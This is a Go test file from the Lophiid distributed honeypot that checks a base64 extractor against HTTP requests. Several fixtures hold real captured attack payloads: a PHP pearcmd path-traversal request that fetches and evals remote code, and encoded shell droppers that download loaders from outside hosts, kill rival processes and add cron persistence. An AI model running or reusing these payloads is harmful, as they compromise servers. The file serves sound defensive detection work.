// Lophiid distributed honeypot
// Copyright (C) 2024 Niels Heinen
//
// This program is free software; you can redistribute it and/or modify it
// under the terms of the GNU General Public License as published by the
// Free Software Foundation; either version 2 of the License, or (at your
// option) any later version.
//
// This program is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
// or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License
// for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
//
package extractors

import (
	"fmt"
	"lophiid/pkg/database"
	"testing"
)

func TestFindBase64Strings(t *testing.T) {
	for _, test := range []struct {
		description   string
		request       database.Request
		base64sToFind []string
		asciiOnly     bool
	}{
		{
			description: "finds full match",
			request: database.Request{
				Body: []byte("aGVsbG8="),
				Uri:  "/fake",
			},
			base64sToFind: []string{"aGVsbG8="},
			asciiOnly:     true,
		},
		{
			description: "finds with rubbish after padding",
			request: database.Request{
				Body: []byte("aGVsbG8=a YQ=="),
				Uri:  "/fake",
			},
			base64sToFind: []string{"aGVsbG8=", "YQ=="},
			asciiOnly:     true,
		},
		{
			description: "finds multiple in body",
			request: database.Request{
				Body: []byte("aGVsbG8= d29ybGQ="),
				Uri:  "/fake",
			},
			base64sToFind: []string{"aGVsbG8=", "d29ybGQ="},
			asciiOnly:     true,
		},
		{
			description: "finds multiple in body and uri",
			request: database.Request{
				Body: []byte("aGVsbG8= d29ybGQ="),
				Uri:  "/fake?aa=YQ==",
			},
			base64sToFind: []string{"aGVsbG8=", "d29ybGQ=", "YQ=="},
			asciiOnly:     true,
		},
		{
			description: "finds multiple in body and uri (encoded)",
			request: database.Request{
				Body: []byte("aGVsbG8= d29ybGQ="),
				Uri:  "/fake?aa=YQ%3D%3D",
			},
			base64sToFind: []string{"aGVsbG8=", "d29ybGQ=", "YQ=="},
			asciiOnly:     true,
		},
		{
			description: "recovers invalid prefix",
			request: database.Request{
				Body: []byte("+aGVsbG8="),
				Uri:  "/fake",
			},
			base64sToFind: []string{"aGVsbG8="},
			asciiOnly:     true,
		},
		{
			description: "ignores invalid",
			request: database.Request{
				Body: []byte("aGVsbG8"),
				Uri:  "/fake",
			},
			base64sToFind: []string{},
			asciiOnly:     true,
		},
		{
			description: "ignores too small",
			request: database.Request{
				Body: []byte("a="),
				Uri:  "/fake",
			},
			base64sToFind: []string{},
			asciiOnly:     true,
		},
		{
			description: "ignores binary",
			request: database.Request{
				Body: []byte("/gEK"),
				Uri:  "/fake",
			},
			base64sToFind: []string{},
			asciiOnly:     true,
		},
		{
			description: "does not ignore binary",
			request: database.Request{
				Body: []byte("/gEK"),
				Uri:  "/fake",
			},
			base64sToFind: []string{"/gEK"},
			asciiOnly:     false,
		},

		// This is a special case because it's not successfully parsed as a URL and
		// therefore treated as a full string.
		// TODO: add fallback parameter parsing that prevents ang= from lang- to be
		// picked up as a base64 string.
		{
			description: "From URI parameter",
			request: database.Request{
				Body: []byte(""),
				Uri:  "/?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?eval(base64_decode('aWYoZmlsdGVyX3ZhcihpbmlfZ2V0KCJhbGxvd191cmxfZm9wZW4iKSxGSUxURVJfVkFMSURBVEVfQk9PTEVBTikpe2V2YWwoZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly80NS45NS4xNDcuMjM2L3giKSk7fWVsc2V7JGg9Y3VybF9pbml0KCJodHRwOi8vNDUuOTUuMTQ3LjIzNi94Iik7Y3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTtjdXJsX3NldG9wdCgkaCxDVVJMT1BUX0hFQURFUiwwKTtldmFsKGN1cmxfZXhlYygkaCkpO2N1cmxfY2xvc2UoJGgpO30='));?>+z.php",
			},
			base64sToFind: []string{"ang=", "aWYoZmlsdGVyX3ZhcihpbmlfZ2V0KCJhbGxvd191cmxfZm9wZW4iKSxGSUxURVJfVkFMSURBVEVfQk9PTEVBTikpe2V2YWwoZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly80NS45NS4xNDcuMjM2L3giKSk7fWVsc2V7JGg9Y3VybF9pbml0KCJodHRwOi8vNDUuOTUuMTQ3LjIzNi94Iik7Y3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTtjdXJsX3NldG9wdCgkaCxDVVJMT1BUX0hFQURFUiwwKTtldmFsKGN1cmxfZXhlYygkaCkpO2N1cmxfY2xvc2UoJGgpO30="},
			asciiOnly:     true,
		},
		{
			description: "parses body as form",
			request: database.Request{
				Body: []byte("aaaa=YWE%3D&foo=cmd+YmI%3D"),
				Raw:  "this is a hack application/x-www-form-urlencoded",
				Uri:  "/fake",
			},
			base64sToFind: []string{"YWE=", "YmI="},
			asciiOnly:     false,
		},
		{
			description: "parses body as form #2",
			request: database.Request{
				Body: []byte("<?=shell_exec('echo Yz1odHRwOi8vMTk0LjM4LjIzLjIvbGRyLnNoP2ViYjA1NgpleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4KZm9yIGkgaW4gMSAxIDEgMSAxIDEgMSAxIDEgMSAxIDEgMSAxIDEgMSAxIDEgMTtkbyBwcyAtZWZ8Z3JlcCAtdiBmYzZifGdyZXAgJ2ZjNmJcfGVwIGN1clx8ZXAgd2dlXHxlcCBpbXAnfGF3ayAne3ByaW50ICQzfSd8eGFyZ3MgLUkgJSBraWxsIC05ICU7ZG9uZQoKcGtpbGwgLTkgLWYga3RocmVhZGRvCnBraWxsIC05IC1mIGZpcmV3YWxsCnBraWxsIC05IC1mICdzb1wudHh0Jwpwa2lsbCAtOSAtZiAnYmFzaCAtcyAzNjczJwpwa2lsbCAtOSAtZiA4MDA1L2NjNQpwa2lsbCAtOSAtZiByZWFkZGtrCnBraWxsIC05IC1mICdmbHVlbmNlL2luc3RhbGxcLnNoJwpwa2lsbCAtOSAtZiAnXC4vXC4nCnBraWxsIC05IC1mICcvdG1wL1wuJwpwa2lsbCAtOSAtZiBrZXJuZWx4CnBraWxsIC05IC1mIGdyZXMtc3lzdGVtCnBraWxsIC05IC1mIGdyZXMta2VybmVsCnBraWxsIC05IC1mIHBhc3RlYmluCnBraWxsIC05IHJlYWRkaQpwa2lsbCAtOSBsYWJraWxsCnBraWxsIC05IGp1aWNlU1NICnBraWxsIC05IHBvc3RncmVzd2sKcGtpbGwgLTkgcG9sc2thCgpmb3IgaSBpbiAkKHBzIC1lZiB8IGdyZXAgYXRsYXNzaWFuIHwgYXdrICd7cHJpbnQgJDJ9Jyk7IGRvCiAgaWYgbHMgLWFsIC9wcm9jLyRpIHwgZ3JlcCBleGUgfCBncmVwICJiaW4vcGVybFx8L2Rldi9zaG0iOyB0aGVuCiAgICBraWxsIC05ICRpCiAgZmkKZG9uZQoKaWYgWyAhIC14ICIkKGNvbW1hbmQgLXYgY3VybCkiIC1hICEgLXggIiQoY29tbWFuZCAtdiB3Z2V0KSIgXTsgdGhlbgogIGNkIC90bXAgfHwgY2QgL3Zhci90bXAKICBjaGF0dHIgLWkgZDsgY2hhdHRyIC1pIGRscjsgcm0gLXJmIGQgZGxyCiAgZWNobyBmMFZNUmdFQkFRQUFBQUFBQUFBQUFBSUFBd0FCQUFBQUhvTUVDRFFBQUFERUF3QUFBQUFBQURRQUlBQURBQ2dBQlFBRUFBRUFBQUFBQUFBQUFJQUVDQUNBQkFpakF3QUFvd01BQUFVQUFBQUFFQUFBQVFBQUFLUURBQUNra3dRSXBKTUVDQUFBQUFBRUFBQUFCZ0FBQUFBUUFBQlI1WFJrQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBR0FBQUFCQUFBQUZXSjVRKzJWUWdQdGtVTUQ3Wk5FTUhpR01IZ0VBbkNEN1pGRk1IaENGMEp3Z25SaWNxSnlJSGlBUDhBQU1IaUNNSGdHQW5RaWNxQjRRQUEvd0RCNmhqQjZRZ0p5Z25RdzFXSjVZUHNFUDkxQ0dvQjZEd0NBQUNEeEJESncxV0o1WVBzRVA5MUNHb0c2Q2NDQUFESncxV0o1WVBzQ1A5MUVQOTFEUDkxQ0dvRjZBOENBQURKdzFXSjVZUHNISXRGQ0lsRjlJdEZESWxGK0l0RkVJbEYvSTFGOUZCcUEycG02T2dCQUFESncxV0o1WVBzQ1A5MUVQOTFEUDkxQ0dvRTZOQUJBQURKdzFXSjVZUHNDUDkxRVA5MURQOTFDR29ENkxnQkFBREp3MVdKNVlQc0hJdEZDSWxGOUl0RkRJbEYrSXRGRUlsRi9JMUY5RkJxQVdwbTZKRUJBQURKdzFXNGRZTUVDSW5sVjFaVGdleXNBQUFBNndGQWdEZ0FkZm90ZFlNRUNJbUZVUC8vLzFCcUFtaDdnd1FJYWdIb2R2Ly8vMm9DYWhkcUptakNBQUFBWnNkRjRBSUFac2RGNGdCUTZLeisvLytEeEJ4by93RUFBR2hCQWdBQWFINkRCQWlKUmVUb0FmLy8vNFBFREdvQWFnRnFBb25INkdELy8vK0R4QkNEK1ArSnhuUUZnLy8vZFEyRDdBeHFBZWl4L3YvL2c4UVFVR29RalVYZ1VGYm80UDcvLzRQRUVJWEFpY041SEZEMzIyb0JhSUtEQkFocUFlanQvdi8vaVJ3azZILysvLytEeEJDTG5WRC8vLzlRZzhNWFUyaUVnd1FJVnVqTS92Ly9nOFFRT2RoMERZUHNER29ENkZYKy8vK0R4QkF4MjFCcUFZMUY4MUJXNk1IKy8vK0R4QkJJZEEyRDdBeHFCT2d6L3YvL2c4UVFENzVGODhIakNBbkRnZnNLRFFvTmRjOVJhSUFBQUFDTm5XRC8vLzlUVnVpSy92Ly9nOFFRaGNCK0RsSlFVMWZvWXY3Ly80UEVFT3ZZZyt3TVZ1Z0Qvdi8vaVR3azZQdjkvLytEeEF4cUFXaWhnd1FJYWdIb08vNy8vOGNFSkFVQUFBRG95ZjMvLzRQRUVJMWw5RnRlWDEzRFZZbmxYZWx5L3YvL2tGVlhWbE9MYkNRc2kzd2tLSXQwSkNTTFZDUWdpMHdrSEl0Y0pCaUxSQ1FVellCYlhsOWRQUUh3Ly84UGd3RUFBQUREZyt3TWljTDMydWdKQUFBQWlSQ0R5UCtEeEF6RHVLU1RCQWpEWVcxa05qUUFJd29BWkd4eUFEOEFSMFZVSUM5amRYSnNMV0Z0WkRZMElFaFVWRkF2TVM0d0RRb05DZ0FqQUFBQUxuTm9jM1J5ZEdGaUFDNTBaWGgwQUM1eWIyUmhkR0VBTG1KemN3QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTEFBQUFBUUFBQUFZQUFBQ1VnQVFJbEFBQUFPRUNBQUFBQUFBQUFBQUFBQVFBQUFBQUFBQUFFUUFBQUFFQUFBQXlBQUFBZFlNRUNIVURBQUF1QUFBQUFBQUFBQUFBQUFBQkFBQUFBUUFBQUJrQUFBQUlBQUFBQXdBQUFLU1RCQWlrQXdBQUJBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQUFBQUJBQUFBQXdBQUFBQUFBQUFBQUFBQXBBTUFBQjRBQUFBQUFBQUFBQUFBQUFFQUFBQUFBQUFBfGJhc2U2NCAtZCA+IGQKICBjaG1vZCAreCBkOyAuL2R8fC4vZDsgcm0gLWYgZDsgY2htb2QgK3ggZGxyCmZpCgooY3VybCAkY3x8d2dldCAtcSAtTy0gJGN8fGN1cmwgLWsgJGN8fHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtTy0gJGN8fC4vZGxyICRjKXxzaAo=|base64 -d|sh')?>"),
				Raw:  "this is a hack application/x-www-form-urlencoded",
				Uri:  "/fake",
			},
			base64sToFind: []string{"exec", "echo", "Yz1odHRwOi8vMTk0LjM4LjIzLjIvbGRyLnNoP2ViYjA1NgpleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4KZm9yIGkgaW4gMSAxIDEgMSAxIDEgMSAxIDEgMSAxIDEgMSAxIDEgMSAxIDEgMTtkbyBwcyAtZWZ8Z3JlcCAtdiBmYzZifGdyZXAgJ2ZjNmJcfGVwIGN1clx8ZXAgd2dlXHxlcCBpbXAnfGF3ayAne3ByaW50ICQzfSd8eGFyZ3MgLUkgJSBraWxsIC05ICU7ZG9uZQoKcGtpbGwgLTkgLWYga3RocmVhZGRvCnBraWxsIC05IC1mIGZpcmV3YWxsCnBraWxsIC05IC1mICdzb1wudHh0Jwpwa2lsbCAtOSAtZiAnYmFzaCAtcyAzNjczJwpwa2lsbCAtOSAtZiA4MDA1L2NjNQpwa2lsbCAtOSAtZiByZWFkZGtrCnBraWxsIC05IC1mICdmbHVlbmNlL2luc3RhbGxcLnNoJwpwa2lsbCAtOSAtZiAnXC4vXC4nCnBraWxsIC05IC1mICcvdG1wL1wuJwpwa2lsbCAtOSAtZiBrZXJuZWx4CnBraWxsIC05IC1mIGdyZXMtc3lzdGVtCnBraWxsIC05IC1mIGdyZXMta2VybmVsCnBraWxsIC05IC1mIHBhc3RlYmluCnBraWxsIC05IHJlYWRkaQpwa2lsbCAtOSBsYWJraWxsCnBraWxsIC05IGp1aWNlU1NICnBraWxsIC05IHBvc3RncmVzd2sKcGtpbGwgLTkgcG9sc2thCgpmb3IgaSBpbiAkKHBzIC1lZiB8IGdyZXAgYXRsYXNzaWFuIHwgYXdrICd7cHJpbnQgJDJ9Jyk7IGRvCiAgaWYgbHMgLWFsIC9wcm9jLyRpIHwgZ3JlcCBleGUgfCBncmVwICJiaW4vcGVybFx8L2Rldi9zaG0iOyB0aGVuCiAgICBraWxsIC05ICRpCiAgZmkKZG9uZQoKaWYgWyAhIC14ICIkKGNvbW1hbmQgLXYgY3VybCkiIC1hICEgLXggIiQoY29tbWFuZCAtdiB3Z2V0KSIgXTsgdGhlbgogIGNkIC90bXAgfHwgY2QgL3Zhci90bXAKICBjaGF0dHIgLWkgZDsgY2hhdHRyIC1pIGRscjsgcm0gLXJmIGQgZGxyCiAgZWNobyBmMFZNUmdFQkFRQUFBQUFBQUFBQUFBSUFBd0FCQUFBQUhvTUVDRFFBQUFERUF3QUFBQUFBQURRQUlBQURBQ2dBQlFBRUFBRUFBQUFBQUFBQUFJQUVDQUNBQkFpakF3QUFvd01BQUFVQUFBQUFFQUFBQVFBQUFLUURBQUNra3dRSXBKTUVDQUFBQUFBRUFBQUFCZ0FBQUFBUUFBQlI1WFJrQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBR0FBQUFCQUFBQUZXSjVRKzJWUWdQdGtVTUQ3Wk5FTUhpR01IZ0VBbkNEN1pGRk1IaENGMEp3Z25SaWNxSnlJSGlBUDhBQU1IaUNNSGdHQW5RaWNxQjRRQUEvd0RCNmhqQjZRZ0p5Z25RdzFXSjVZUHNFUDkxQ0dvQjZEd0NBQUNEeEJESncxV0o1WVBzRVA5MUNHb0c2Q2NDQUFESncxV0o1WVBzQ1A5MUVQOTFEUDkxQ0dvRjZBOENBQURKdzFXSjVZUHNISXRGQ0lsRjlJdEZESWxGK0l0RkVJbEYvSTFGOUZCcUEycG02T2dCQUFESncxV0o1WVBzQ1A5MUVQOTFEUDkxQ0dvRTZOQUJBQURKdzFXSjVZUHNDUDkxRVA5MURQOTFDR29ENkxnQkFBREp3MVdKNVlQc0hJdEZDSWxGOUl0RkRJbEYrSXRGRUlsRi9JMUY5RkJxQVdwbTZKRUJBQURKdzFXNGRZTUVDSW5sVjFaVGdleXNBQUFBNndGQWdEZ0FkZm90ZFlNRUNJbUZVUC8vLzFCcUFtaDdnd1FJYWdIb2R2Ly8vMm9DYWhkcUptakNBQUFBWnNkRjRBSUFac2RGNGdCUTZLeisvLytEeEJ4by93RUFBR2hCQWdBQWFINkRCQWlKUmVUb0FmLy8vNFBFREdvQWFnRnFBb25INkdELy8vK0R4QkNEK1ArSnhuUUZnLy8vZFEyRDdBeHFBZWl4L3YvL2c4UVFVR29RalVYZ1VGYm80UDcvLzRQRUVJWEFpY041SEZEMzIyb0JhSUtEQkFocUFlanQvdi8vaVJ3azZILysvLytEeEJDTG5WRC8vLzlRZzhNWFUyaUVnd1FJVnVqTS92Ly9nOFFRT2RoMERZUHNER29ENkZYKy8vK0R4QkF4MjFCcUFZMUY4MUJXNk1IKy8vK0R4QkJJZEEyRDdBeHFCT2d6L3YvL2c4UVFENzVGODhIakNBbkRnZnNLRFFvTmRjOVJhSUFBQUFDTm5XRC8vLzlUVnVpSy92Ly9nOFFRaGNCK0RsSlFVMWZvWXY3Ly80UEVFT3ZZZyt3TVZ1Z0Qvdi8vaVR3azZQdjkvLytEeEF4cUFXaWhnd1FJYWdIb08vNy8vOGNFSkFVQUFBRG95ZjMvLzRQRUVJMWw5RnRlWDEzRFZZbmxYZWx5L3YvL2tGVlhWbE9MYkNRc2kzd2tLSXQwSkNTTFZDUWdpMHdrSEl0Y0pCaUxSQ1FVellCYlhsOWRQUUh3Ly84UGd3RUFBQUREZyt3TWljTDMydWdKQUFBQWlSQ0R5UCtEeEF6RHVLU1RCQWpEWVcxa05qUUFJd29BWkd4eUFEOEFSMFZVSUM5amRYSnNMV0Z0WkRZMElFaFVWRkF2TVM0d0RRb05DZ0FqQUFBQUxuTm9jM1J5ZEdGaUFDNTBaWGgwQUM1eWIyUmhkR0VBTG1KemN3QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTEFBQUFBUUFBQUFZQUFBQ1VnQVFJbEFBQUFPRUNBQUFBQUFBQUFBQUFBQVFBQUFBQUFBQUFFUUFBQUFFQUFBQXlBQUFBZFlNRUNIVURBQUF1QUFBQUFBQUFBQUFBQUFBQkFBQUFBUUFBQUJrQUFBQUlBQUFBQXdBQUFLU1RCQWlrQXdBQUJBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQUFBQUJBQUFBQXdBQUFBQUFBQUFBQUFBQXBBTUFBQjRBQUFBQUFBQUFBQUFBQUFFQUFBQUFBQUFBfGJhc2U2NCAtZCA+IGQKICBjaG1vZCAreCBkOyAuL2R8fC4vZDsgcm0gLWYgZDsgY2htb2QgK3ggZGxyCmZpCgooY3VybCAkY3x8d2dldCAtcSAtTy0gJGN8fGN1cmwgLWsgJGN8fHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtTy0gJGN8fC4vZGxyICRjKXxzaAo="},
			asciiOnly:     false,
		},

		{
			description: "handles real payload",
			request: database.Request{
				Uri:  "/fake",
				Body: []byte("script=def command = 'echo IyEvYmluL3NoCnJlYWRsaW5rIC9wcm9jL3NlbGYvZXhlIHwgZ3JlcCBidXN5Ym94CmlmIFsgJD8gLWVxIDAgXTsgdGhlbgogIGVjaG8gImJ1c3liaXQiCiAgZXhpdCAxCmZpCnBzIGF1eCB8IGF3ayAne2lmKCQzID4gOTApIHByaW50ICQyfScgfCB4YXJncyBraWxsIC1TSUdTVE9QCnBzIC1BIC1vIHN0YXQscGlkIHwgZ3JlcCAnXlQnIHwgYXdrICd7cHJpbnQgJDJ9JyB8IHhhcmdzIGtpbGwgLTkKaWYgWyAiJChpZCAtdSkiICE9ICIwIiBdOyB0aGVuCiAgZGlycj0kKHRpbWVvdXQgMzAgZmluZCAvIC10eXBlIGQgXCggLXBhdGggL3Byb2MgLW8gLXBhdGggL3N5cyBcKSAtcHJ1bmUgLW8gLXdyaXRhYmxlIC1leGVjdXRhYmxlIC10eXBlIGQgLXByaW50IDI+L2Rldi9udWxsIHwgaGVhZCAtbiAxKQpmaQppZiBbICIkZGlyciIgPSAiIiBdOyB0aGVuCiAgZGlycj0vdG1wCmZpCmRpcnI9IiRkaXJyL2R1ZXQiCm1rZGlyICRkaXJyCmNobW9kIDc3NyAkZGlycgpjZCAkZGlycgpzaGEyNTZzdW0gYXBwIHwgZ3JlcCBmYjEwMWY0ZGI3NzNhZDE1ZTNkZTQwMTZlNGI2NTE2YTcyMzJkYzQ5OWQ4ODY5YTI3OTUyNGJmMzRhMjhmMTU2CmlmIFsgJD8gLW5lIDAgXTsgdGhlbgogIGNobW9kIDc1NSBhcHAKICBuYW09ImNlcnQiCiAgZWRzPSJodHRwczovL2JlcnJ5c3RvcmUubWUvbGluZS1hdXRoLyRuYW0iCiAgdGltZW91dCAxMjAgY3VybCAtbyAkbmFtIC0taW5zZWN1cmUgJGVkcwogIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgdGltZW91dCAxMjAgd2dldCAtTyAkbmFtICRlZHMKICAgIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgICBwcmludGYgIkdFVCAvbGluZS1hdXRoLyRuYW0gSFRUUC8xLjBcclxuSG9zdDogYmVycnlzdG9yZS5tZTo0NDNcclxuXHJcbiIgfCB0aW1lb3V0IDEyMCBvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCBiZXJyeXN0b3JlLm1lOjQ0MyAyPi9kZXYvbnVsbCB8IHRhaWwgLS1ieXRlIDMzNzYyMDggPiAkbmFtICAKICAgIGZpCiAgZmkKICBvcGVuc3NsIGVuYyAtaW4gY2VydCAtZCAtYWVzMjU2IC1tZCBzaGEyNTYgLXBhc3MgJ3Bhc3M6Q00jZjM0RyNUJFYjKmc1ZVRSNSR0cicgfCB0YXIgLXp4ZiAtCiAgcm0gY2VydApmaQpjaG1vZCA3NTUgYXBwCgpjcm9ubnk9IiogKiAqICogKiAvdXNyL2Jpbi9mbG9jayAtbiAvdmFyL3RtcC92ZXJsLmxvY2sgLWMgJ2NkICRkaXJyOyBleGVjIC4vYXBwICYnIgooY3JvbnRhYiAtbCAyPi9kZXYvbnVsbDsgZWNobyAiJGNyb25ueSIpIHwgYXdrICchYVskMF0rKycgfCBjcm9udGFiIC0KCkRCVVNfU0VTU1NJT05fQlVTX0FERFJFU1M9dW5peDovcnVuL3VzZXIvJChpZCAtdSkvYnVzIHN5c3RlbWQtcnVuIC0tdXNlciAtLW9uLWNhbGVuZGFyPScqOio6MDAnIC91c3IvYmluL2Zsb2NrIC1uIC92YXIvdG1wL3ZlcmwubG9jayAtYyAnY2QgJGRpcnI7IGV4ZWMgLi9hcHAgJicKCmVjaG8gIjAgUGpjYjQzYTI5MCIgPiBzdHJwdHIKdHJhcCAnJyBTSUcKKCBzbGVlcCA0MDsga2lsbCAtOSAkUFBJRCApICYKZXhlYyAuL2FwcAo= | base64 --decode | sh'; def proc = ['sh', '-c', command].execute(); proc.waitFor();"),
			},
			base64sToFind: []string{"IyEvYmluL3NoCnJlYWRsaW5rIC9wcm9jL3NlbGYvZXhlIHwgZ3JlcCBidXN5Ym94CmlmIFsgJD8gLWVxIDAgXTsgdGhlbgogIGVjaG8gImJ1c3liaXQiCiAgZXhpdCAxCmZpCnBzIGF1eCB8IGF3ayAne2lmKCQzID4gOTApIHByaW50ICQyfScgfCB4YXJncyBraWxsIC1TSUdTVE9QCnBzIC1BIC1vIHN0YXQscGlkIHwgZ3JlcCAnXlQnIHwgYXdrICd7cHJpbnQgJDJ9JyB8IHhhcmdzIGtpbGwgLTkKaWYgWyAiJChpZCAtdSkiICE9ICIwIiBdOyB0aGVuCiAgZGlycj0kKHRpbWVvdXQgMzAgZmluZCAvIC10eXBlIGQgXCggLXBhdGggL3Byb2MgLW8gLXBhdGggL3N5cyBcKSAtcHJ1bmUgLW8gLXdyaXRhYmxlIC1leGVjdXRhYmxlIC10eXBlIGQgLXByaW50IDI+L2Rldi9udWxsIHwgaGVhZCAtbiAxKQpmaQppZiBbICIkZGlyciIgPSAiIiBdOyB0aGVuCiAgZGlycj0vdG1wCmZpCmRpcnI9IiRkaXJyL2R1ZXQiCm1rZGlyICRkaXJyCmNobW9kIDc3NyAkZGlycgpjZCAkZGlycgpzaGEyNTZzdW0gYXBwIHwgZ3JlcCBmYjEwMWY0ZGI3NzNhZDE1ZTNkZTQwMTZlNGI2NTE2YTcyMzJkYzQ5OWQ4ODY5YTI3OTUyNGJmMzRhMjhmMTU2CmlmIFsgJD8gLW5lIDAgXTsgdGhlbgogIGNobW9kIDc1NSBhcHAKICBuYW09ImNlcnQiCiAgZWRzPSJodHRwczovL2JlcnJ5c3RvcmUubWUvbGluZS1hdXRoLyRuYW0iCiAgdGltZW91dCAxMjAgY3VybCAtbyAkbmFtIC0taW5zZWN1cmUgJGVkcwogIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgdGltZW91dCAxMjAgd2dldCAtTyAkbmFtICRlZHMKICAgIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgICBwcmludGYgIkdFVCAvbGluZS1hdXRoLyRuYW0gSFRUUC8xLjBcclxuSG9zdDogYmVycnlzdG9yZS5tZTo0NDNcclxuXHJcbiIgfCB0aW1lb3V0IDEyMCBvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCBiZXJyeXN0b3JlLm1lOjQ0MyAyPi9kZXYvbnVsbCB8IHRhaWwgLS1ieXRlIDMzNzYyMDggPiAkbmFtICAKICAgIGZpCiAgZmkKICBvcGVuc3NsIGVuYyAtaW4gY2VydCAtZCAtYWVzMjU2IC1tZCBzaGEyNTYgLXBhc3MgJ3Bhc3M6Q00jZjM0RyNUJFYjKmc1ZVRSNSR0cicgfCB0YXIgLXp4ZiAtCiAgcm0gY2VydApmaQpjaG1vZCA3NTUgYXBwCgpjcm9ubnk9IiogKiAqICogKiAvdXNyL2Jpbi9mbG9jayAtbiAvdmFyL3RtcC92ZXJsLmxvY2sgLWMgJ2NkICRkaXJyOyBleGVjIC4vYXBwICYnIgooY3JvbnRhYiAtbCAyPi9kZXYvbnVsbDsgZWNobyAiJGNyb25ueSIpIHwgYXdrICchYVskMF0rKycgfCBjcm9udGFiIC0KCkRCVVNfU0VTU1NJT05fQlVTX0FERFJFU1M9dW5peDovcnVuL3VzZXIvJChpZCAtdSkvYnVzIHN5c3RlbWQtcnVuIC0tdXNlciAtLW9uLWNhbGVuZGFyPScqOio6MDAnIC91c3IvYmluL2Zsb2NrIC1uIC92YXIvdG1wL3ZlcmwubG9jayAtYyAnY2QgJGRpcnI7IGV4ZWMgLi9hcHAgJicKCmVjaG8gIjAgUGpjYjQzYTI5MCIgPiBzdHJwdHIKdHJhcCAnJyBTSUcKKCBzbGVlcCA0MDsga2lsbCAtOSAkUFBJRCApICYKZXhlYyAuL2FwcAo="},
			asciiOnly:     true,
		},
	} {

		t.Run(test.description, func(t *testing.T) {
			fmt.Printf("Running test: %s\n", test.description)
			res := make(map[string][]byte)
			be := NewBase64Extractor(res, test.asciiOnly)
			be.ParseRequest(&test.request)
			if len(res) != len(test.base64sToFind) {
				t.Errorf("expected %d base64s but found %d (%v)", len(test.base64sToFind), len(res), res)
			}

			for _, v := range test.base64sToFind {
				_, ok := res[v]
				if !ok {
					t.Errorf("expected to find %s in %v", v, res)
				}
			}
		})
	}
}

func TestBase64ExtractorUsesSubextractors(t *testing.T) {
	urlRes := make(map[string]struct{})
	ue := NewURLExtractor(urlRes)

	res := make(map[string][]byte)
	be := NewBase64Extractor(res, true)
	be.AddSubExtractor(ue)

	// This encoded string has the URL http://example.org
	be.ParseString("test ZGRzcyBodHRwOi8vZXhhbXBsZS5vcmcgc3Nk test")

	if len(urlRes) != 1 {
		t.Errorf("expected 1 url but found %d (%v)", len(urlRes), urlRes)
	}
}
